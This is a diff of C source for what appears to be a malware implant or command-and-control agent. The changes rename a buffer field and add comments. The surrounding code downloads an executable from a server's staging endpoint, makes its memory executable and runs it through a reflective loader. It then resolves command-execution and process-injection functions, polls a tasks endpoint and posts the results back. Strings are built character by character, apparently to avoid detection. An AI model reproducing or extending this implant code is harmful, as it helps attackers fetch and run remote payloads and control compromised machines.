@@ -16,6 +16,17 @@
 #define UUID_M '1','1','e','3','b','2','7','c','-','a','1','e','7','-','4','2','2','4','-','b','4','d','9','-','3','a','f','3','6','f','a','2','f','0','d','0',0
 #endif
 
+// TODO: Pass the name of the reflective loader as a parameter
+/*
+This function runs the function named "ReflectiveLoader" in a reflective dll
+execueRD uses GetRLOffset which looks for the name "ReflectiveLoader"
+
+Input:
+    PAPI api: a pointer to the API struct
+    PDLL: a pointer to the DLL struct that holds a reflective DLL
+Output:
+    HANDLE: handle to the new region the DLL has been written to, this handle needs to be freed
+*/
 HANDLE executeRD(PAPI api, PDLL pDll)
 {
     DWORD loaderOffset;
@@ -23,22 +34,22 @@ HANDLE executeRD(PAPI api, PDLL pDll)
     DLLMAIN pDllMain;
 
     // get the offset of the reflective loader
-    loaderOffset = GetRLOffset(api, pDll->Buffer);
+    loaderOffset = GetRLOffset(api, pDll->pBuffer);
 
     #ifdef DEBUG
     WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
     //((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
-    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->Buffer + loaderOffset);
+    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)pDll->pBuffer + loaderOffset);
     #endif
 
     // get the real address of the reflective loader, cast it to a function
-    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->Buffer + loaderOffset);
+    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)pDll->pBuffer + loaderOffset);
 
     // TODO: Revert PAGE_EXECUTE_READWRITE protections
     // TODO: Use PAGE_EXECUTE_READ protections instead
     DWORD dwOldProtect;
     // give the memory region that holds the reflective loader execute-read-write permissions
-    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->Buffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+    ((VIRTUALPROTECT)api->VirtualProtect)(pDll->pBuffer, pDll->Size, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
     // run the reflective loader
     // reflective loader returns an address to DLLMain, cast it to a function pointer
@@ -269,7 +280,7 @@ void myMain()
 
     DLL esgStdDll;
     PDLL pEsgStdDll = &esgStdDll;
-    pEsgStdDll->Buffer = NULL;
+    pEsgStdDll->pBuffer = NULL;
 
     WCHAR wServer[] = { SERVER_M } ;
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
@@ -280,11 +291,11 @@ void myMain()
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
     WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
-    while (pEsgStdDll->Buffer == NULL)
+    while (pEsgStdDll->pBuffer == NULL)
     {
-        pEsgStdDll->Buffer = httpGetExecutable(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
+        pEsgStdDll->pBuffer = httpGetExecutable(api, &pEsgStdDll->Size, wcStageEndpoint, wServer, port);
         ((SLEEP)api->Sleep)(5000);
-        if (pEsgStdDll->Buffer != NULL)
+        if (pEsgStdDll->pBuffer != NULL)
         { break; }
         #ifdef DEBUG
         ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
@@ -294,15 +305,16 @@ void myMain()
     ESG_STD_API EsgStdApi = { 0 };
     PESG_STD_API PEsgStdApi = &EsgStdApi;
 
-    pEsgStdDll->Buffer = executeRD(api, pEsgStdDll);
+    // TODO: am I losing a pointer in heap here?
+    pEsgStdDll->pBuffer = executeRD(api, pEsgStdDll);
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
     CHAR injectIntoProcess_c[] = { 'i', 'n', 'j', 'e', 'c', 't', 'I', 'n', 't', 'o', 'P', 'r', 'o', 'c', 'e', 's', 's', 0 };
 
-    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, runCmd_c);
-    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, whoami_c);
-    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->Buffer, injectIntoProcess_c);
+    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, runCmd_c);
+    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, whoami_c);
+    PEsgStdApi->injectIntoProcess = GetSymbolAddress((HANDLE)pEsgStdDll->pBuffer, injectIntoProcess_c);
 
     //WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
     WCHAR fullPath[] = { '/', 't', 'a', 's', 'k', 's', '/', UUID_M };
@@ -398,9 +410,9 @@ void myMain()
             ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, encodedExitOutput);
             PostRequest(api, wServer, port, fullPath2, json);
 
-            if (pEsgStdDll->Buffer)
+            if (pEsgStdDll->pBuffer)
             {
-                ((FREE)api->free)(pEsgStdDll->Buffer);
+                ((FREE)api->free)(pEsgStdDll->pBuffer);
             }
             if (json)
             {
@@ -460,9 +472,9 @@ void myMain()
 
         ((SLEEP)api->Sleep)(3000);
     }
-    if (pEsgStdDll->Buffer)
+    if (pEsgStdDll->pBuffer)
     {
-        ((FREE)api->free)(pEsgStdDll->Buffer);
+        ((FREE)api->free)(pEsgStdDll->pBuffer);
     }
 }
 
